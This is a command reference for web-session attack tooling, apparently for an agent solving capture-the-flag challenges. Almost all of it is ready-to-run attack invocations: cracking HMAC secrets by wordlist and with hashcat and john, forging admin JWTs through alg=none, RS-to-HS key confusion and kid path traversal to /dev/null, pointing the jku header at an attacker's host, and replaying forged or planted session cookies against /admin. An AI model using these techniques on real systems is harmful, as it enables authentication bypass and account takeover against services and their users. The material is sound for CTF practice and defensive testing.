# Tooling — verified invocations

Every flag below was checked against `python3 tools/web/<tool>.py --help`
at the time of writing. The tools emit the shape `tools/hooks.py` wants —
prefer them over hand-rolled `curl`.

---

## `tools/web/session_dissect.py` — what the token IS

```text
session_dissect.py [-h] [--token VALUE] [--cookie JAR] [--url URL]
                   [--stdin] [--raw] [--jar] [-H K: V]
                   [--timeout TIMEOUT] [--follow-redirects]
                   [--try-keys] [--wordlist PATH] [--max-keys MAX_KEYS]
                   [--salt SALT] [--challenge CHALLENGE] [--now EPOCH]
                   [--no-pyjwt] [--selftest] [--compact]
```

```bash
# classify a token you already have
python3 tools/web/session_dissect.py --token "$TOKEN" --challenge "$C"

# classify every cookie in a jar
python3 tools/web/session_dissect.py --cookie 'session=...; other=...' --challenge "$C"

# fetch and analyze the cookies a URL sets
python3 tools/web/session_dissect.py --url "$BASE/login" -H 'Cookie: a=b' --challenge "$C"

# dictionary attack on an HMAC secret (JWT, itsdangerous, express-signed)
python3 tools/web/session_dissect.py --token "$TOKEN" --try-keys --wordlist secrets.txt --max-keys 200000

# the token carries a timestamp; pin "now" for reproducibility
python3 tools/web/session_dissect.py --token "$TOKEN" --now 1700000000

# analysis only — never forges, never sends
```

Output fields: `format` (jwt / jwe / itsdangerous / django / rails /
fernet / express-signed / base64-json / opaque), decoded claims where
free, `weakness` (the named class), `next` (the `http_probe` or
`jwt_forge` invocation to run).

## `tools/web/jwt_forge.py` — mint the attack token

```text
jwt_forge.py [-h] [--token TOKEN] [--claims CLAIMS] [--secret SECRET]
             [--alg {,hs256,hs384,hs512}] [--pubkey PUBKEY]
             [--kid KID] [--kid-secret KID_SECRET] [--jku JKU]
             [--selftest]
```

```bash
# alg=none (empty --alg); also try --alg none / NONE / nOnE variants
python3 tools/web/jwt_forge.py --token "$T" --claims '{"role":"admin"}' --alg ''

# re-sign with a recovered HS* secret
python3 tools/web/jwt_forge.py --token "$T" --claims '{"role":"admin"}' --secret secret123

# force a specific alg
python3 tools/web/jwt_forge.py --token "$T" --claims '{"role":"admin"}' --alg hs256 --secret k

# RS->HS confusion — PEM file whose bytes you hold
python3 tools/web/jwt_forge.py --token "$T" --claims '{"role":"admin"}' --pubkey pubkey.pem

# kid path traversal — empty secret via /dev/null
python3 tools/web/jwt_forge.py --token "$T" --kid ../../../../dev/null --kid-secret ''

# kid → a known-content file
python3 tools/web/jwt_forge.py --token "$T" --kid /proc/sys/kernel/randomize_va_space --kid-secret '2'

# jku — point the JWKS fetch at your host
python3 tools/web/jwt_forge.py --token "$T" --jku "https://$YOU/jwks.json"
```

The tool prints the forged token; **you** verify acceptance with
`http_probe.py --header "Authorization: Bearer <forged>"` or
`--header "Cookie: session=<forged>"` — the forge itself is never the
verdict.

## `tools/web/http_probe.py` — replay + verbatim excerpt

```text
http_probe.py --challenge CHALLENGE --class CLASS --url URL
              [--header ...] [--body ...] [--method ...]
              [--evidence-regex RE] [--evidence-kind class|impact|surface]
              [--on-match verdict] [--on-miss verdict]
              [--status STATUS] [--timeout S]
```

```bash
# forged-token acceptance — the impact check
python3 tools/web/http_probe.py --challenge "$C" --class web-auth-session \
  --url "$BASE/admin" --header "Authorization: Bearer $FORGED" \
  --evidence-regex '"role"\s*:\s*"admin"|flag\{' --evidence-kind impact \
  --on-match confirms --on-miss refutes

# session-fixation replay
python3 tools/web/http_probe.py --challenge "$C" --class web-auth-session \
  --url "$BASE/api/me" --header "Cookie: session=$PLANTED" \
  --evidence-regex '"user"\s*:\s*"victim"' --evidence-kind impact \
  --on-match confirms --on-miss refutes

# surface-only probe — login returns a token; inconclusive on both branches
python3 tools/web/http_probe.py --challenge "$C" --class web-auth-session \
  --url "$BASE/login" --body '{"user":"a","pass":"b"}' \
  --evidence-regex 'Set-Cookie' --evidence-kind surface \
  --on-match inconclusive --on-miss inconclusive
```

## `tools/web/id_sweep.py` — enumerable ids

```bash
python3 tools/web/id_sweep.py --help   # real flags at runtime
```

Use for sequential session ids, reset tokens in a small numeric range,
`user_id` enumeration — anything that walks an integer space.

## `tools/web/race_probe.py` — TOCTOU on the auth surface

```bash
python3 tools/web/race_probe.py --help
```

Use for MFA-code single-use races, "limited attempts" counter races,
registration races (the htb-ssos shape). The tool runs a serial baseline
first — a signature that appears serially is not a race.

## `tools/hooks.py` — the write gate

```bash
python3 tools/hooks.py pre-flag --value "flag{...}" --source "forged admin JWT on /admin" --evidence "..."
python3 tools/hooks.py post-probe <name> --hypothesis-id H1 --class web-auth-session \
  --verdict confirms --evidence-kind impact \
  --evidence '"role": "admin"' --response '<the verbatim response body>'
```

`pre-flag`/`post-probe` are subcommands — the flags live on the
subcommand, not the tool.

## `tools/state.py` / `tools/decide.py`

```bash
python3 tools/state.py <name> --show
python3 tools/decide.py <name>
python3 tools/state.py <name> --strategy-used writeup_search
```

## External tools — measured environment

- `hashcat -m 16500` — JWT HS* dictionary attack.
- `john --format=HMAC-SHA256` — same.
- `flask-unsign` — NOT installed; replicate its sign path with
  `itsdangerous` stdlib or `session_dissect --try-keys` for key recovery.
- `pyjwt` — absent; `jwt_forge.py` is stdlib, doesn't need it.
